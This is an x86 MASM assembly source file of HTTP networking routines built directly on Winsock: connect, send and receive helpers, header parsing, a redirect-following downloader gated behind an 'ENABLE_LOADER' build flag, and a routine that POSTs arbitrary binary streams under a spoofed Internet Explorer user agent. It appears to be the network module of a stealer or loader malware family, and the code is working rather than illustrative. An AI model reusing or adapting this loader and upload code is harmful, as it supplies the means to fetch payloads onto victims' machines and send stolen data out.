; Network functions

DOWN_LIMIT		equ	10*1024*1024
RECV_WAIT_TIMEOUT	equ	90

; Returns resolved ip, or INADDR_NONE
WNetResolve proc lpHost
        invoke  inet_addr, lpHost
        cmp     eax, INADDR_NONE
        jnz     @res_err
        invoke  gethostbyname, lpHost
        .IF     eax == 0
                mov     eax, INADDR_NONE
        .ELSE
                mov     eax, [eax][hostent.h_list]
                nop
                .IF     !eax
                        mov     eax, INADDR_NONE
                        jmp     @res_err
                .ENDIF
                mov     eax, dword ptr[eax]
                mov     eax, dword ptr[eax]
        .ENDIF

@res_err:
        ret
WNetResolve endp

ZeroMemory proto :DWORD, :DWORD
; Connects to Host/IP with needed port, returns socket or 0 on error
WNetConnect proc uses ebx szHost, IP, port
        LOCAL   sin: sockaddr_in

        xor     ebx, ebx

        invoke  socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
        .IF     eax == INVALID_SOCKET 
                jmp     @nc_ret
        .ENDIF
        mov     ebx, eax
        invoke  ZeroMemory, addr sin, sizeof sockaddr_in
                
        mov     sin.sin_family, AF_INET
        mov     ecx, port
        xchg    cl, ch
        mov     sin.sin_port, cx

        .IF     (IP)
                mov     eax, IP
        .ELSEIF !((IP)||(szHost))
                jmp     @sock_err
        .ELSE
                invoke  WNetResolve, szHost
                .IF     eax == INADDR_NONE
                        jmp     @sock_err
                .ENDIF
        .ENDIF
        mov     sin.sin_addr.S_un.S_addr, eax

        invoke  connect, ebx, addr sin, sizeof sockaddr_in
        .IF     eax == SOCKET_ERROR
@sock_err:
                invoke  closesocket, ebx
                xor     ebx, ebx
        .ENDIF

@nc_ret:
        mov     eax, ebx
        ret
WNetConnect endp

WNetSendUntilBytes proc uses ebx edi s, buf, bytes
	.IF	!bytes
		; Nothing to send
		mov	eax, TRUE
		ret
	.ENDIF

	mov	edi, buf
	mov	ebx, FALSE

@inf:
	invoke  send, s, edi, bytes, 0

	test	eax, eax
	jle	@snd

	add	edi, eax
	sub	bytes, eax

	.IF	!bytes
		mov	ebx, TRUE
		jmp	@snd
	.ENDIF
	
	jmp	@inf


@snd:
	mov	eax, ebx
	ret
WNetSendUntilBytes endp

; Waits for timeout until avaible some data for recv, returns TRUE on SUCCESS
WNetWaitRecv proc s, timeout
        LOCAL   fd: fd_set
        LOCAL   to: timeval

        m2m     to.tv_sec, timeout
        mov     to.tv_usec, 0

        mov     fd.fd_count, 1          ; FD_ZERO
        lea     eax, fd.fd_array
        m2m     [eax], s                ; FD_SET

        invoke  select, 0, addr fd, NULL, NULL, addr to
        .IF     (eax == SOCKET_ERROR) || (eax == 0)
                xor     eax, eax
        .ELSE
                mov     eax, TRUE
        .ENDIF
        ret
WNetWaitRecv endp

; Receives until specified char is reached, returns TRUE on SUCCESS
NetRecvUntilChar proc uses ebx s, stream, maxlen, char
        LOCAL   lpBuf: BYTE

        sub     ebx, ebx
        invoke  WNetWaitRecv, s, RECV_WAIT_TIMEOUT
        .IF     eax
        @@:
        	invoke  WNetWaitRecv, s, RECV_WAIT_TIMEOUT
        	.IF	!eax
        		jmp	@nrc_ret
		.ENDIF

                invoke  recv, s, addr lpBuf, 1, 0
                test    eax, eax
                jle     @nrc_ret

                mov     eax, char
                .IF     lpBuf == al
                        mov     bl, 1
                .ENDIF

                coinvoke stream, IStream, Write, addr lpBuf, 1, 0
                invoke  StreamGetLength, stream
                .IF     eax >= maxlen
                        jmp     @nrc_ret
                .ENDIF

                test    ebx, ebx
                jz      @B
        .ENDIF

@nrc_ret:
        mov     eax, ebx
        ret
NetRecvUntilChar endp

WNetRecvUntilEnd proc uses ebx s, stream, maxlen
	LOCAL   lpBuf[2048]: BYTE

	sub     ebx, ebx
	invoke  WNetWaitRecv, s, RECV_WAIT_TIMEOUT
	.IF     eax
	@@:
		invoke  WNetWaitRecv, s, RECV_WAIT_TIMEOUT
		.IF	!eax
			jmp	@nrc_ret
		.ENDIF

		.IF	maxlen > 2048
			mov	eax, 2048
		.ELSE
			mov	eax, maxlen
		.ENDIF

		invoke  recv, s, addr lpBuf, eax, 0
		test    eax, eax
		.IF	SIGN?
			; eax < 0
			jmp	@nrc_ret
		.ENDIF

		.IF	ZERO?
			; eax = 0
			inc	ebx
			jmp	@nrc_ret
		.ENDIF

		push	eax
		coinvoke stream, IStream, Write, addr lpBuf, eax, 0
		pop	eax

		sub	maxlen, eax
		.IF	!maxlen
			inc	ebx
			jmp	@nrc_ret
		.ENDIF

		test    ebx, ebx
		jz      @B
	.ENDIF

@nrc_ret:
	mov     eax, ebx
	ret
WNetRecvUntilEnd endp

.data

CDefaultUserAgent db "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)",0

szHTTPSendFmt	db	"POST %s HTTP/1.0",13,10
				db	"Host: %s",13,10
				db	"Accept: */*",13,10
				db	"Accept-Encoding: identity, *;q=0",13,10
				db	"Accept-Language: en-US",13,10
				db	"Content-Length: %lu",13,10
				db	"Content-Type: application/octet-stream",13,10
				db	"Connection: close",13,10
				db	"Content-Encoding: binary",13,10
				db	"User-Agent: %s",13,10,13,10,0

.code

; Returns offset to the data (skips header + CRLFCRLF)
HTTPSeekHeader proc uses edi stream
        LOCAL   buf, read: DWORD

        xor     edi, edi
@loop:
        invoke  StreamSeekOffset, stream, edi, 0
        mov     buf, 0
        coinvoke stream, IStream, Read, addr buf, 4, addr read
        inc     edi
        cmp     buf, 0a0d0a0dh
        jz      @found
        cmp     read, 0
        jnz     @loop
        xor     eax, eax
        jmp     @ret

@found:
        mov     eax, edi
        add     eax, 3 ; Skip CRLFCRLF
       
@ret:
        ret
HTTPSeekHeader endp

lstrdup proto :DWORD

.data
	szContLen	db	"Content-Length:",0
	szLocation	db	"Location:",0
	
.code

NetWorks proc uses ebx edi s, lpOutStream, lpszRedir
	LOCAL	lpBuf: DWORD
	LOCAL	dwExtraLen: DWORD
	LOCAL	stream: DWORD

	invoke	MemAlloc, 32000
	mov	lpBuf, eax

	invoke	StreamCreate, addr stream

	xor	ebx, ebx
@l:
	invoke  NetRecvUntilChar, s, stream, 64000, 0ah
	test    eax, eax
	jz      @ht_ret_close

	invoke  StreamGetLength, stream
	.IF     eax > 64000
		jmp     @ht_ret_close
	.ENDIF

	invoke  HTTPSeekHeader, stream
	test    eax, eax
	jz      @l

	invoke  StreamGotoBegin, stream
	coinvoke stream, IStream, Read, lpBuf, 8500, NULL

	mov	dwExtraLen, 0
	invoke	StrStrI, lpBuf, offset szContLen
	push	ebx
	.IF	eax
		mov	edi, eax
		invoke	lstrlen, offset szContLen
		add	edi, eax
		push	edi
		inc	edi

		mov	ebx, edi

	        mov     ecx, 4500
	        mov     al, 0dh
	        repnz scasb
	        mov     eax, 4500
	        sub     eax, ecx
	        mov     byte ptr[edi-1], 0

	        push	edi

	        invoke	StrToInt, ebx
	        mov	dwExtraLen, eax

		pop	edi
	        mov     byte ptr[edi-1], 0dh

		pop	edi
	.ENDIF
	pop	ebx

	invoke	StrStrI, lpBuf, offset szLocation
	push	ebx
	.IF	eax
		mov	edi, eax
		invoke	lstrlen, offset szLocation
		add	edi, eax
		push	edi
		inc	edi

		mov	ebx, edi

	        mov     ecx, 4500
	        mov     al, 0dh
	        repnz scasb
	        mov     eax, 4500
	        sub     eax, ecx
	        mov     byte ptr[edi-1], 0

	        push	edi

	        invoke	lstrdup, ebx
	        mov	edx, lpszRedir
	        .IF	edx
		        mov	dword ptr[edx], eax
		.ELSE
			invoke	MemFree, eax
		.ENDIF

		pop	edi
	        mov     byte ptr[edi-1], 0dh

		pop	edi
	.ENDIF
	pop	ebx

        ; remove header
        invoke	StreamClear, stream

        .IF	dwExtraLen <= 0
        	mov	dwExtraLen, DOWN_LIMIT
	.ENDIF

	; recv until DC
	invoke	WNetRecvUntilEnd, s, stream, dwExtraLen

	; Empty stream (headers only)
	invoke	StreamGetLength, stream
	.IF	!eax
		jmp	@ht_ret_close
	.ENDIF

	.IF	eax
		coinvoke stream, IStream, Clone, lpOutStream
		test	eax, eax
		.IF	SUCCEEDED
			mov	ebx, TRUE
		.ENDIF
	.ENDIF

@ht_ret_close:
	coinvoke stream, IStream, Release
	invoke	MemFree, lpBuf

	mov	eax, ebx
	ret
NetWorks endp

IFDEF ENABLE_LOADER

.code

; do not move this block to .data, - MS FIX

szHTTPHdrFmt	db	"GET %s HTTP/1.0",13,10
				db	"Host: %s",13,10
				db	"Accept-Language: en-US",13,10
				db	"Accept: */*",13,10
				db	"Accept-Encoding: identity, *;q=0",13,10
				db	"Connection: close",13,10
				db	"User-Agent: %s",13,10,13,10,0

MyDownloadWithRedir proc uses edi ebx szLink, lpOutStream, lpszRedir
    LOCAL	pHost: DWORD
	LOCAL   uc: URL_COMPONENTS   
    LOCAL	pFmt: DWORD
    LOCAL	s: DWORD
    LOCAL	pURL: DWORD
    LOCAL	len: DWORD
	LOCAL	pUserAgent: DWORD
    LOCAL	cbUserAgent: DWORD

    sub	ebx, ebx
    invoke	MemAlloc, 8192
    mov	pHost, eax

    invoke	MemAlloc, 8192
    mov	pURL, eax

    invoke	MemAlloc, 8192
    mov	pFmt, eax

    invoke	MemAlloc, 8192
    mov	pUserAgent, eax
    mov	cbUserAgent, 8192

    lea	edi, uc
    mov	ecx, sizeof URL_COMPONENTS
    xor	eax, eax
    rep stosb

    mov     uc.dwStructSize, sizeof URL_COMPONENTS

    mov     uc.dwHostNameLength, 8191
    mov	uc.dwUrlPathLength, 8191

    push	pHost
    pop	uc.lpszHostName

    push	pURL
    pop	uc.lpszUrlPath


    invoke  InternetCrackUrl, szLink, 0, ICU_ESCAPE, addr uc
    .IF     (!eax) || (uc.lpszHostName == NULL)
    	jmp     @md_ret
	.ENDIF

	; Escape
	mov	len, 8191
	invoke	InternetCreateUrl, addr uc, ICU_ESCAPE, pFmt, addr len
	.IF     (!eax)
    	jmp     @md_ret
	.ENDIF

	; Get escaped URL path
	mov	eax, pURL
	mov	byte ptr[eax], 0

	cld
    lea	edi, uc
    mov	ecx, sizeof URL_COMPONENTS
    xor	eax, eax
    rep stosb

    mov uc.dwStructSize, sizeof URL_COMPONENTS

    push pURL
    pop	uc.lpszUrlPath

    mov	uc.dwHostNameLength, 8191
    mov	uc.dwUrlPathLength, 8191

	invoke  InternetCrackUrl, pFmt, 0, 0, addr uc
	.IF     (!eax) || (uc.lpszHostName == NULL)
    	jmp     @md_ret
	.ENDIF


	invoke	ObtainUserAgentString, 0, pUserAgent, addr cbUserAgent
	test	eax, eax
	.IF	SUCCEEDED
		invoke	wsprintf, pFmt, offset szHTTPHdrFmt, pURL, pHost, pUserAgent
	.ELSE
		invoke	wsprintf, pFmt, offset szHTTPHdrFmt, pURL, pHost, offset CDefaultUserAgent
	.ENDIF

	movzx	eax, uc.nPort
	invoke	WNetConnect, pHost, 0, eax
	.IF	!eax
		jmp	@md_ret
	.ENDIF

	; socket
	mov	s, eax

	; Send header
	invoke	lstrlen, pFmt
	invoke	WNetSendUntilBytes, s, pFmt, eax
	.IF	!eax
		jmp	@md_close_sock
	.ENDIF

	invoke	NetWorks, s, lpOutStream, lpszRedir
	mov	ebx, eax

@md_close_sock:
	invoke	closesocket, s

@md_ret:
	invoke	MemFree, pURL
	invoke	MemFree, pFmt
	invoke	MemFree, pHost
	invoke	MemFree, pUserAgent

	mov	eax, ebx
	ret
MyDownloadWithRedir endp

MyDownload proc szLink, lpOutStream
	LOCAL	lpszRedir: DWORD

	mov	eax, lpOutStream
	.IF	eax
		mov	dword ptr[eax], 0
	.ENDIF

	mov	lpszRedir, NULL
	invoke	MyDownloadWithRedir, szLink, lpOutStream, addr lpszRedir
	.IF	lpszRedir
		invoke	MyDownloadWithRedir, lpszRedir, lpOutStream, NULL
		push	eax
		invoke	MemFree, lpszRedir
		pop	eax
	.ENDIF
	ret
MyDownload endp

ENDIF

WNetSetLinger proc s
	LOCAL	l: linger
	mov	l.l_onoff, 1
	mov	l.l_linger, 45
	invoke	setsockopt, s, SOL_SOCKET, SO_LINGER, addr l, sizeof linger
	ret
WNetSetLinger endp

MyUpload proc uses edi ebx szLink, lpData, dwLen, lpOutStream
        LOCAL   uc: URL_COMPONENTS   
        LOCAL	pHost: DWORD
        LOCAL	pFmt: DWORD
        LOCAL	pURL: DWORD
        LOCAL	s: DWORD
        LOCAL	len: DWORD
        LOCAL	lpszRedir: DWORD
        LOCAL	pUserAgent: DWORD
        LOCAL	cbUserAgent: DWORD

		mov	lpszRedir, 0

        xor	ebx, ebx
        invoke	MemAlloc, 4096
        mov	pHost, eax

        invoke	MemAlloc, 4096
        mov	pURL, eax

        invoke	MemAlloc, 4096
        mov	pFmt, eax

        invoke	MemAlloc, 4096
        mov	pUserAgent, eax

        mov	cbUserAgent, 4096

        lea	edi, uc
        mov	ecx, sizeof URL_COMPONENTS
        xor	eax, eax
        rep stosb

        mov     uc.dwStructSize, sizeof URL_COMPONENTS

        push	pHost
        pop	uc.lpszHostName

        push	pURL
        pop	uc.lpszUrlPath

        mov     uc.dwHostNameLength, 4095
        mov	uc.dwUrlPathLength, 4095

        invoke  InternetCrackUrl, szLink, 0, ICU_ESCAPE, addr uc
        .IF     (!eax) || (uc.lpszHostName == NULL)
                jmp     @md_ret
	.ENDIF

	; Escape
	mov	len, 4095
	invoke	InternetCreateUrl, addr uc, ICU_ESCAPE, pFmt, addr len
        .IF     (!eax)
                jmp     @md_ret
	.ENDIF

	; Get escaped URL path
	mov	eax, pURL
	mov	byte ptr[eax], 0

        lea	edi, uc
        mov	ecx, sizeof URL_COMPONENTS
        xor	eax, eax
        rep stosb

        mov     uc.dwStructSize, sizeof URL_COMPONENTS

        push	pURL
        pop	uc.lpszUrlPath

        mov     uc.dwHostNameLength, 4095
        mov	uc.dwUrlPathLength, 4095

        invoke  InternetCrackUrl, pFmt, 0, 0, addr uc
        .IF     (!eax) || (uc.lpszHostName == NULL)
                jmp     @md_ret
	.ENDIF

	invoke	ObtainUserAgentString, 0, pUserAgent, addr cbUserAgent
	test	eax, eax
	.IF	SUCCEEDED
		invoke	wsprintf, pFmt, offset szHTTPSendFmt, pURL, pHost, dwLen, pUserAgent
	.ELSE
		invoke	wsprintf, pFmt, offset szHTTPSendFmt, pURL, pHost, dwLen, offset CDefaultUserAgent
	.ENDIF

	movzx	eax, uc.nPort
	invoke	WNetConnect, pHost, 0, eax
	.IF	!eax
		jmp	@md_ret
	.ENDIF

	; socket
	mov	s, eax

	invoke	WNetSetLinger, s

	; Send header
	invoke	lstrlen, pFmt
	invoke	WNetSendUntilBytes, s, pFmt, eax
	.IF	!eax
		jmp	@md_close_sock
	.ENDIF

	; Send form data
	.IF	dwLen
		invoke	WNetSendUntilBytes, s, lpData, dwLen
		.IF	!eax
			jmp	@md_close_sock
		.ENDIF
	.ENDIF

	mov	ebx, eax
	
	.IF	ebx	
		invoke	NetWorks, s, lpOutStream, addr lpszRedir
		mov	ebx, eax
	.ENDIF

@md_close_sock:
	invoke	closesocket, s

@md_ret:
	invoke	MemFree, pHost
	invoke	MemFree, pFmt
	invoke	MemFree, pURL
	invoke	MemFree, pUserAgent
	
	.IF	lpszRedir
		invoke	MemFree, lpszRedir
	.ENDIF

	mov	eax, ebx
	ret
MyUpload endp

MyUploadStream proc uses ebx szLink, lpInputStream, lpOutStream
	LOCAL	mem: DWORD
	LOCAL	len: DWORD
	
	sub	ebx, ebx
	
	.IF	lpInputStream && lpOutStream
		invoke	GetHGlobalFromStream, lpInputStream, addr mem
		test	eax, eax
		.IF	SUCCEEDED
			invoke	StreamGetLength, lpInputStream
			mov	len, eax
			invoke	GlobalLock, mem
			.IF	eax
				invoke	MyUpload, szLink, eax, len, lpOutStream
				mov	ebx, eax
				
				invoke	GlobalUnlock, mem
			.ENDIF
		.ENDIF
		invoke	StreamGotoEnd, lpInputStream
	.ENDIF
	
	mov	eax, ebx
	ret
MyUploadStream endp

MyDownloadInit proc
	LOCAL	WSAData: WSADATA

	invoke  WSAStartup, 0101h, addr WSAData ; useless shit
	ret
MyDownloadInit endp
